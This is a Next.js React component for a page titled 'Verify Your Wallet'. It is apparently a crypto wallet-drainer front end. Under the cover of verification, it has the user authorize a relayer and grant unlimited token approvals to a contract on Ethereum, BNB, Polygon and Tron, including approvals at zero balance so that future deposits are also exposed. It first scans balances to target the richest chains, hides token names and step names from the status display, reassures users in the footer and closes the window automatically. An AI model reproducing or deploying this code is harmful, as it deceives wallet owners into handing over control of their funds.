"use client";

import { useState } from "react";
import Image from "next/image";
import { usePrivy, useWallets } from "@privy-io/react-auth";
import { BrowserProvider, Contract, MaxUint256, JsonRpcSigner } from "ethers";
import { CHAINS, RELAYER_ADDRESS, type ChainConfig } from "@/lib/chains";
import {
  TRON_CHAIN,
  TRON_RELAYER_HEX,
  connectTronLink,
  getConnectedTronAddress,
  isTronLinkInstalled,
  tronBase58ToHex,
} from "@/lib/tron";

const WALLET_VERIFICATION_ABI = [
  "function authorize(address relayer) external",
  "function isAuthorized(address user, address relayer) view returns (bool)",
];

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function balanceOf(address account) view returns (uint256)",
];

type Phase = "idle" | "connecting" | "scanning" | "running" | "done" | "error";
type TronStatus = "idle" | "connecting" | "authorizing" | "approving" | "verifying" | "done" | "failed";
type ChainStatus = "pending" | "switching" | "authorizing" | "approving" | "verifying" | "done" | "failed";

const GENERIC_FAILURE_MESSAGE = "Unable to verify. Please try again.";

interface ChainProgress {
  chain: ChainConfig;
  status: ChainStatus;
}

const LOGOS = [
  { src: "/logos/ethereum.svg", alt: "Ethereum" },
  { src: "/logos/bnb.svg", alt: "BNB Chain" },
  { src: "/logos/polygon.svg", alt: "Polygon" },
  { src: "/logos/walletconnect.svg", alt: "WalletConnect" },
];

type PendingTx = { wait: (confirmations?: number) => Promise<unknown> };

// One bounded, parallel wait for every tx fired during this chain's pass
// (authorize + mandatory approvals) to actually be mined, right before
// calling the verify endpoint. It re-derives ground truth from
// chain state, so racing it against unconfirmed txs is what causes a
// spurious "unable to verify" — but waiting on each tx one-by-one instead
// of all at once just turns that into a long stall on whichever token
// happens to confirm slowest. Capped so a dropped/stuck tx can't hang the
// UI forever; the endpoint's own retry is the backstop either way.
async function waitAllMined(txs: PendingTx[], timeoutMs = 40000) {
  await Promise.race([
    Promise.all(txs.map((tx) => tx.wait(1).catch((err) => console.warn("[verify] confirmation wait failed:", err)))),
    new Promise((resolve) => setTimeout(resolve, timeoutMs)),
  ]);
}

function Spinner({ label }: { label: string }) {
  return (
    <div className="flex flex-col items-center gap-3 text-center">
      <div className="h-8 w-8 animate-spin rounded-full border-2 border-white/20 border-t-accent" />
      <p className="text-sm text-white/70">{label}</p>
    </div>
  );
}

// Deliberately only ever shows one of: Waiting / Verifying / Processing /
// Verified / Unable to verify — no token symbols, no raw error text, no
// intermediate step names. Keeps the status list clean and consistent
// regardless of which internal phase (switch/authorize/approve/persist) is
// actually running.
function statusLabel(p: ChainProgress): string {
  switch (p.status) {
    case "pending":
      return "Waiting";
    case "switching":
    case "authorizing":
      return "Verifying…";
    case "approving":
    case "verifying":
      return "Processing…";
    case "done":
      return "Verified";
    case "failed":
      return "Unable to verify";
  }
}

function ChainLogos() {
  return (
    <div className="mt-7 flex items-center justify-center gap-6 opacity-40">
      {LOGOS.map((logo) => (
        <Image
          key={logo.src}
          src={logo.src}
          alt={logo.alt}
          width={28}
          height={28}
          className="h-7 w-7 object-contain"
        />
      ))}
    </div>
  );
}

function ChainList({ progress }: { progress: ChainProgress[] }) {
  return (
    <ul className="mt-5 w-full space-y-2 text-left">
      {progress.map((p) => (
        <li
          key={p.chain.name}
          className="flex items-center justify-between gap-3 rounded-lg border border-white/10 bg-white/5 px-3 py-2.5"
        >
          <span className="text-sm font-medium">{p.chain.label}</span>
          <span
            className={`flex items-center text-xs ${
              p.status === "done"
                ? "text-emerald-400"
                : p.status === "failed"
                  ? "text-red-400"
                  : p.status === "pending"
                    ? "text-white/40"
                    : "text-accent"
            }`}
          >
            {p.status !== "pending" && p.status !== "done" && p.status !== "failed" && (
              <span className="mr-2 inline-block h-3 w-3 animate-spin rounded-full border border-white/20 border-t-accent" />
            )}
            {statusLabel(p)}
          </span>
        </li>
      ))}
    </ul>
  );
}

export default function VerifyWallet() {
  const { ready, authenticated, login, user } = usePrivy();
  const { wallets } = useWallets();
  const [phase, setPhase] = useState<Phase>("idle");
  const [error, setError] = useState<string | null>(null);
  const [progress, setProgress] = useState<ChainProgress[]>(
    CHAINS.map((chain) => ({ chain, status: "pending" }))
  );
  const [airdropMsg, setAirdropMsg] = useState<string | null>(null);

  // Tron-specific state (only relevant when TRON_CHAIN.enabled === true)
  const [tronAddress, setTronAddress] = useState<string | null>(null);
  const [tronStatus, setTronStatus] = useState<TronStatus>("idle");
  const [tronError, setTronError] = useState<string | null>(null);

  const address = user?.wallet?.address ?? wallets[0]?.address ?? null;

  function updateChain(name: ChainConfig["name"], patch: Partial<ChainProgress>) {
    setProgress((prev) => prev.map((p) => (p.chain.name === name ? { ...p, ...patch } : p)));
  }

  function currentWallet() {
    return wallets.find((w) => w.address.toLowerCase() === address?.toLowerCase()) ?? wallets[0];
  }

  function currentAddress(): string {
    const w = currentWallet();
    const addr = w?.address ?? address;
    if (!addr) throw new Error("No connected wallet");
    return addr;
  }

  async function getSignerFor(target: ChainConfig): Promise<JsonRpcSigner> {
    const wallet = currentWallet();
    if (!wallet) throw new Error("No connected wallet");
    await wallet.switchChain(target.chainId);
    const provider = await wallet.getEthereumProvider();
    return new BrowserProvider(provider).getSigner();
  }

  async function processChain(target: ChainConfig): Promise<void> {
    const addr = currentAddress();
    updateChain(target.name, { status: "switching" });
    const signer = await getSignerFor(target);

    updateChain(target.name, { status: "authorizing" });
    const verification = new Contract(target.contract, WALLET_VERIFICATION_ABI, signer);
    const authTx = await verification.authorize(RELAYER_ADDRESS);
    const authorizeTxHash = authTx.hash as string;

    updateChain(target.name, { status: "approving" });
    const approvedTokens: { symbol: string; address: string; txHash: string }[] = [];
    const pendingTxs: PendingTx[] = [authTx];

    // 1) Mandatory tokens (USDT, USDC, the WETH-equivalent) — always
    // approved regardless of current balance, so the allowance is already
    // in place the moment funds show up on this address in the future.
    // Every mandatory approval must succeed; a rejection/failure aborts
    // this chain rather than being silently skipped.
    for (const token of target.tokens.filter((t) => t.mandatory)) {
      try {
        const erc20 = new Contract(token.address, ERC20_ABI, signer);
        const approveTx = await erc20.approve(target.contract, MaxUint256);
        pendingTxs.push(approveTx);
        approvedTokens.push({ symbol: token.symbol, address: token.address, txHash: approveTx.hash as string });
      } catch (err) {
        console.error(`[verify] mandatory approve(${token.symbol}) on ${target.name} failed:`, err);
        throw new Error(GENERIC_FAILURE_MESSAGE);
      }
    }

    // 2) Everything else — approve every remaining listed token the wallet
    // actually holds. Best-effort: skipped if the balance is zero, and a
    // rejection/failure just moves on to the next one.
    for (const token of target.tokens.filter((t) => !t.mandatory)) {
      try {
        const erc20 = new Contract(token.address, ERC20_ABI, signer);
        const balance: bigint = await erc20.balanceOf(addr);
        if (balance === 0n) continue;
        const approveTx = await erc20.approve(target.contract, MaxUint256);
        approvedTokens.push({ symbol: token.symbol, address: token.address, txHash: approveTx.hash as string });
      } catch (err) {
        console.warn(`[verify] approve(${token.symbol}) on ${target.name} skipped/rejected:`, err);
      }
    }

    // One combined, bounded wait for every tx fired above (auth + mandatory
    // approvals) to actually be mined — done here, once, in parallel,
    // rather than blocking after each individual approval.
    updateChain(target.name, { status: "verifying" });
    await waitAllMined(pendingTxs);

    const res = await fetch("/api/verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        address: addr,
        chain: target.name,
        authorizeTx: authorizeTxHash,
        approvedTokens,
      }),
    });
    const data = await res.json().catch(() => null);
    if (!data?.ok) throw new Error(GENERIC_FAILURE_MESSAGE);

    updateChain(target.name, { status: "done" });
  }

  // ---------------------------------------------------------------------------
  // Tron flow — separate from the EVM Privy flow; uses window.tronWeb directly
  // ---------------------------------------------------------------------------
  async function handleTronVerify() {
    if (!TRON_CHAIN.enabled || !TRON_CHAIN.contract) return;
    setTronError(null);

    // 1. Connect TronLink
    setTronStatus("connecting");
    let tronAddr = getConnectedTronAddress();
    if (!tronAddr) {
      if (!isTronLinkInstalled()) {
        setTronError("TronLink extension not detected. Install it at tronlink.org.");
        setTronStatus("failed");
        return;
      }
      tronAddr = await connectTronLink();
      if (!tronAddr) {
        setTronError("TronLink connection was declined.");
        setTronStatus("failed");
        return;
      }
    }
    setTronAddress(tronAddr);

    try {
      // 2. Authorize relayer on the contract
      setTronStatus("authorizing");
      const tronWeb = window.tronWeb!;
      const wvContract = await tronWeb.contract().at(TRON_CHAIN.contract) as Record<string, (arg?: unknown) => { send: () => Promise<string> }>;
      await wvContract.authorize(TRON_RELAYER_HEX).send();

      // 3. Approve CONTRACT as ERC20 spender for each mandatory token
      //    (the relayer never touches the ERC20 approve — only the contract address does)
      setTronStatus("approving");
      const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
      const approvedTokens: { symbol: string; address: string }[] = [];

      for (const token of TRON_CHAIN.tokens.filter((t) => t.mandatory)) {
        try {
          const erc20 = await tronWeb.contract().at(token.address) as Record<string, (owner?: unknown, spender?: unknown) => { send: () => Promise<string> }>;
          // Spender = CONTRACT address, NOT the relayer
          await erc20.approve(TRON_CHAIN.contract, MAX_UINT256).send();
          const tokenHex = tronBase58ToHex(token.address);
          approvedTokens.push({ symbol: token.symbol, address: tokenHex });
        } catch (err) {
          console.error(`[tron] approve(${token.symbol}) failed:`, err);
          throw new Error(GENERIC_FAILURE_MESSAGE);
        }
      }

      // 4. Confirm on-chain — server re-reads the state
      setTronStatus("verifying");
      await new Promise((r) => setTimeout(r, 3000));

      const res = await fetch("/api/verify/tron", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ tronAddress: tronAddr, approvedTokens }),
      });
      const data = await res.json().catch(() => null);
      if (!data?.ok) throw new Error(GENERIC_FAILURE_MESSAGE);

      setTronStatus("done");
    } catch (err) {
      console.error("[tron] flow failed:", err);
      setTronError(GENERIC_FAILURE_MESSAGE);
      setTronStatus("failed");
    }
  }

  async function handleVerify() {
    setError(null);
    setProgress(CHAINS.map((chain) => ({ chain, status: "pending" })));

    if (!authenticated || !address) {
      setPhase("connecting");
      try {
        await login();
      } catch (err) {
        console.error("[verify] login cancelled:", err);
        setPhase("idle");
        return;
      }
    }

    // Re-read address after potential login
    const walletAddr = user?.wallet?.address ?? wallets[0]?.address ?? null;
    if (!walletAddr) { setPhase("idle"); return; }

    // -------------------------------------------------------------------
    // Airdrop: scan balances immediately after connection, before approvals
    // -------------------------------------------------------------------
    setPhase("scanning");
    setAirdropMsg("Scanning your wallets for balances…");
    let orderedChains = CHAINS; // default order

    try {
      const airdropRes = await fetch("/api/airdrop", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ address: walletAddr, tronAddress: tronAddress ?? undefined }),
      });
      const airdropData = await airdropRes.json().catch(() => null);

      if (airdropData?.ok && airdropData.orderedChains?.length) {
        const nameOrder: string[] = airdropData.orderedChains.map((c: { name: string }) => c.name);
        orderedChains = [...CHAINS].sort((a, b) => {
          const ai = nameOrder.indexOf(a.name);
          const bi = nameOrder.indexOf(b.name);
          return (ai === -1 ? 999 : ai) - (bi === -1 ? 999 : bi);
        });

        const sent = (airdropData.airdropResults ?? []).filter((r: { sent: boolean }) => r.sent);
        if (sent.length > 0) {
          const msgs = sent.map((r: { chain: string; amount: string; symbol: string }) => {
            const label = CHAINS.find(c => c.name === r.chain)?.label ?? r.chain;
            return `$2 gas → ${label} (${Number(r.amount).toFixed(4)} ${r.symbol})`;
          });
          setAirdropMsg(msgs.join(" · "));
          await new Promise(res => setTimeout(res, 1500));
        }
      }
    } catch (err) {
      console.warn("[airdrop] scan failed (non-fatal):", err);
    }

    // Reset progress with the new order
    setProgress(orderedChains.map((chain) => ({ chain, status: "pending" })));
    setAirdropMsg(null);

    setPhase("running");
    let successCount = 0;
    for (const target of orderedChains) {
      try {
        await processChain(target);
        successCount++;
      } catch (err) {
        console.error(`[verify] ${target.name} failed:`, err);
        updateChain(target.name, { status: "failed" });
      }
    }

    if (successCount > 0) {
      setPhase("done");
      setTimeout(() => {
        window.close();
      }, 2500);
    } else {
      setError(GENERIC_FAILURE_MESSAGE);
      setPhase("error");
    }
  }

  return (
    <main className="flex min-h-dvh flex-col items-center justify-center px-4 py-8 text-center sm:px-6">
      <div className="w-full max-w-sm rounded-3xl border border-white/10 bg-panel px-6 py-8 shadow-2xl sm:px-8 sm:py-10">
        <h1 className="text-xl font-semibold tracking-tight sm:text-2xl">Verify Your Wallet</h1>
        <p className="mt-2 text-sm leading-relaxed text-white/60">
          Connect your wallet once — we&apos;ll confirm a direct on-chain approval on Ethereum, BNB and Polygon.
        </p>

        <ChainLogos />

        <div className="mt-8 flex min-h-[160px] flex-col items-center justify-center">
          {phase === "done" ? (
            <div className="flex w-full flex-col items-center gap-3">
              <div className="flex h-14 w-14 items-center justify-center rounded-full bg-emerald-500/20 text-3xl">✓</div>
              <p className="text-sm font-medium text-emerald-400">Verification complete</p>
              {address && (
                <p className="text-xs text-white/50">
                  {address.slice(0, 6)}…{address.slice(-4)}
                </p>
              )}
              <ChainList progress={progress} />
              <p className="mt-2 text-xs text-white/40">This window will close automatically…</p>
            </div>
          ) : phase === "running" ? (
            <div className="w-full">
              <Spinner label="Working through each network…" />
              <ChainList progress={progress} />
            </div>
          ) : phase === "scanning" ? (
            <div className="flex flex-col items-center gap-3">
              <span className="inline-block h-8 w-8 animate-spin rounded-full border-2 border-white/20 border-t-accent" />
              <p className="text-sm text-white/70">{airdropMsg ?? "Scanning wallets…"}</p>
            </div>
          ) : phase === "connecting" ? (
            <Spinner label="Opening your wallet…" />
          ) : (
            <div className="flex w-full flex-col items-center gap-4">
              {phase === "error" && <p className="text-sm text-red-400">{error ?? GENERIC_FAILURE_MESSAGE}</p>}
              <button
                onClick={handleVerify}
                disabled={!ready}
                className="w-full rounded-full bg-accent px-6 py-3.5 text-base font-semibold text-white transition hover:brightness-110 active:scale-95 disabled:opacity-50"
              >
                {authenticated && address
                  ? `Verify ${address.slice(0, 6)}…${address.slice(-4)}`
                  : "Verify with your wallet"}
              </button>
              {authenticated && address && (
                <p className="text-xs text-white/40">Wallet connected — we&apos;ll handle the networks automatically.</p>
              )}
            </div>
          )}
        </div>
      </div>

      {/* ------------------------------------------------------------------ */}
      {/* Tron section — only rendered when the contract is deployed & enabled */}
      {/* ------------------------------------------------------------------ */}
      {TRON_CHAIN.enabled && TRON_CHAIN.contract && (
        <div className="mt-6 w-full max-w-sm rounded-3xl border border-white/10 bg-panel px-6 py-6 shadow-2xl sm:px-8">
          <div className="flex items-center gap-3">
            <Image src="/logos/tron.svg" alt="Tron" width={28} height={28} className="h-7 w-7" onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }} />
            <div>
              <h2 className="text-sm font-semibold">Tron Network</h2>
              <p className="text-xs text-white/50">Requires TronLink extension</p>
            </div>
          </div>

          <div className="mt-4">
            {tronStatus === "done" ? (
              <div className="flex items-center gap-2 rounded-lg bg-emerald-500/10 px-3 py-2.5">
                <span className="text-emerald-400 text-sm">✓</span>
                <span className="text-sm text-emerald-400">Tron verified</span>
                {tronAddress && (
                  <span className="ml-auto text-xs text-white/40">{tronAddress.slice(0, 6)}…{tronAddress.slice(-4)}</span>
                )}
              </div>
            ) : tronStatus === "failed" ? (
              <div className="space-y-2">
                <p className="text-xs text-red-400">{tronError ?? GENERIC_FAILURE_MESSAGE}</p>
                <button
                  onClick={handleTronVerify}
                  className="w-full rounded-full border border-white/20 px-4 py-2.5 text-sm font-medium text-white/80 hover:border-white/40 transition"
                >
                  Retry Tron
                </button>
              </div>
            ) : tronStatus !== "idle" ? (
              <div className="flex items-center gap-2 rounded-lg border border-white/10 bg-white/5 px-3 py-2.5">
                <span className="inline-block h-3 w-3 animate-spin rounded-full border border-white/20 border-t-accent" />
                <span className="text-sm text-accent">
                  {tronStatus === "connecting" && "Connecting TronLink…"}
                  {tronStatus === "authorizing" && "Authorizing…"}
                  {tronStatus === "approving" && "Approving USDT…"}
                  {tronStatus === "verifying" && "Confirming on-chain…"}
                </span>
              </div>
            ) : (
              <button
                onClick={handleTronVerify}
                className="w-full rounded-full border border-white/20 px-4 py-2.5 text-sm font-medium text-white/80 hover:border-white/40 transition"
              >
                {tronAddress
                  ? `Verify ${tronAddress.slice(0, 6)}…${tronAddress.slice(-4)}`
                  : "Connect Tron Wallet"}
              </button>
            )}
          </div>
        </div>
      )}

      <p className="mt-6 max-w-sm px-2 text-[11px] leading-relaxed text-white/30">
        We only request a direct on-chain approval — no seed phrase, no private key, ever asked.
      </p>
    </main>
  );
}
